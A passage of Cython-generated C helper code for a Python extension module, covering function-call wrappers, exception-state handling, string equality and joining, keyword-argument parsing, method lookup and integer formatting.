    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif


#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {
    PyObject *value;
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (!PyErr_Occurred()) {
            if (unlikely(PyTuple_Check(key))) {
                PyObject* args = PyTuple_Pack(1, key);
                if (likely(args)) {
                    PyErr_SetObject(PyExc_KeyError, args);
                    Py_DECREF(args);
                }
            } else {
                PyErr_SetObject(PyExc_KeyError, key);
            }
        }
        return NULL;
    }
    Py_INCREF(value);
    return value;
}
#endif


static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      CYTHON_UNUSED Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind;
    Py_ssize_t i, char_pos;
    void *result_udata;
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely(char_pos + ulength < 0))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + char_pos * result_ukind, udata, (size_t) (ulength * result_ukind));
        } else {
            #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    result_ulength++;
    value_count++;
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}


#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif


#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif


#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}


#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif


static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname) {
    PyErr_Format(PyExc_UnboundLocalError, "local variable '%s' referenced before assignment", varname);
}


static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}


static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}


static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}


static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}


static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}


static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (descr != NULL) {
        *method = descr;
        return 0;
    }
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(name));
#endif
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}


static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}


static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x) {
    if (likely(PyList_CheckExact(L))) {
        if (unlikely(__Pyx_PyList_Append(L, x) < 0)) return -1;
    } else {
        PyObject* retval = __Pyx_PyObject_CallMethod1(L, __pyx_n_s_append, x);
        if (unlikely(!retval))
            return -1;
        Py_DECREF(retval);
    }
    return 0;
}


static const char DIGIT_PAIRS_10[2*10*10+1] = {
    "00010203040506070809"
    "10111213141516171819"
    "20212223242526272829"
    "30313233343536373839"
    "40414243444546474849"
    "50515253545556575859"
    "60616263646566676869"
    "70717273747576777879"
    "80818283848586878889"
    "90919293949596979899"
};
static const char DIGIT_PAIRS_8[2*8*8+1] = {
    "0001020304050607"
    "1011121314151617"
    "2021222324252627"
    "3031323334353637"
    "4041424344454647"
    "5051525354555657"
    "6061626364656667"
    "7071727374757677"
};
static const char DIGITS_HEX[2*16+1] = {
    "0123456789abcdef"
    "0123456789ABCDEF"
};


static PyObject* __Pyx_PyUnicode_BuildFromAscii(Py_ssize_t ulength, char* chars, int clength,
                                                int prepend_sign, char padding_char) {
    PyObject *uval;
    Py_ssize_t uoffset = ulength - clength;
#if CYTHON_USE_UNICODE_INTERNALS
    Py_ssize_t i;
#if CYTHON_PEP393_ENABLED
    void *udata;
    uval = PyUnicode_New(ulength, 127);
    if (unlikely(!uval)) return NULL;
    udata = PyUnicode_DATA(uval);
#else
    Py_UNICODE *udata;
    uval = PyUnicode_FromUnicode(NULL, ulength);
    if (unlikely(!uval)) return NULL;
    udata = PyUnicode_AS_UNICODE(uval);
#endif
    if (uoffset > 0) {
        i = 0;
        if (prepend_sign) {
            __Pyx_PyUnicode_WRITE(PyUnicode_1BYTE_KIND, udata, 0, '-');
            i++;
        }
        for (; i < uoffset; i++) {
            __Pyx_PyUnicode_WRITE(PyUnicode_1BYTE_KIND, udata, i, padding_char);
        }
    }
    for (i=0; i < clength; i++) {
        __Pyx_PyUnicode_WRITE(PyUnicode_1BYTE_KIND, udata, uoffset+i, chars[i]);
    }
#else
    {
        PyObject *sign = NULL, *padding = NULL;
        uval = NULL;
        if (uoffset > 0) {
            prepend_sign = !!prepend_sign;
            if (uoffset > prepend_sign) {
                padding = PyUnicode_FromOrdinal(padding_char);
                if (likely(padding) && uoffset > prepend_sign + 1) {
                    PyObject *tmp;
                    PyObject *repeat = PyInt_FromSsize_t(uoffset - prepend_sign);
                    if (unlikely(!repeat)) goto done_or_error;
                    tmp = PyNumber_Multiply(padding, repeat);
                    Py_DECREF(repeat);
                    Py_DECREF(padding);
                    padding = tmp;
                }
                if (unlikely(!padding)) goto done_or_error;
            }
            if (prepend_sign) {
                sign = PyUnicode_FromOrdinal('-');
                if (unlikely(!sign)) goto done_or_error;
            }
        }
        uval = PyUnicode_DecodeASCII(chars, clength, NULL);
        if (likely(uval) && padding) {
            PyObject *tmp = PyNumber_Add(padding, uval);
            Py_DECREF(uval);
            uval = tmp;
        }
        if (likely(uval) && sign) {
            PyObject *tmp = PyNumber_Add(sign, uval);
            Py_DECREF(uval);
            uval = tmp;
        }
done_or_error:
        Py_XDECREF(padding);
        Py_XDECREF(sign);
    }
#endif
    return uval;
}


static CYTHON_INLINE PyObject* __Pyx_PyUnicode_From_Py_ssize_t(Py_ssize_t value, Py_ssize_t width, char padding_char, char format_char) {
    char digits[sizeof(Py_ssize_t)*3+2];
    char *dpos, *end = digits + sizeof(Py_ssize_t)*3+2;
    const char *hex_digits = DIGITS_HEX;
    Py_ssize_t length, ulength;
    int prepend_sign, last_one_off;
    Py_ssize_t remaining;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const Py_ssize_t neg_one = (Py_ssize_t) -1, const_zero = (Py_ssize_t) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (format_char == 'X') {
        hex_digits += 16;
        format_char = 'x';
    }
    remaining = value;
    last_one_off = 0;
    dpos = end;
    do {
        int digit_pos;
        switch (format_char) {
        case 'o':
            digit_pos = abs((int)(remaining % (8*8)));
            remaining = (Py_ssize_t) (remaining / (8*8));
            dpos -= 2;
            memcpy(dpos, DIGIT_PAIRS_8 + digit_pos * 2, 2);
            last_one_off = (digit_pos < 8);
            break;
        case 'd':
            digit_pos = abs((int)(remaining % (10*10)));
            remaining = (Py_ssize_t) (remaining / (10*10));
            dpos -= 2;
            memcpy(dpos, DIGIT_PAIRS_10 + digit_pos * 2, 2);
            last_one_off = (digit_pos < 10);
            break;
        case 'x':
            *(--dpos) = hex_digits[abs((int)(remaining % 16))];
            remaining = (Py_ssize_t) (remaining / 16);
            break;
        default:
            assert(0);
            break;
        }
    } while (unlikely(remaining != 0));
    if (last_one_off) {
        assert(*dpos == '0');
        dpos++;
    }
    length = end - dpos;
    ulength = length;
    prepend_sign = 0;
    if (!is_unsigned && value <= neg_one) {
        if (padding_char == ' ' || width <= length + 1) {
            *(--dpos) = '-';
            ++length;
        } else {
            prepend_sign = 1;
        }
        ++ulength;
    }
    if (width > ulength) {
        ulength = width;
    }
    if (ulength == 1) {
        return PyUnicode_FromOrdinal(*dpos);
    }
    return __Pyx_PyUnicode_BuildFromAscii(ulength, dpos, (int) length, prepend_sign, padding_char);
}


static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
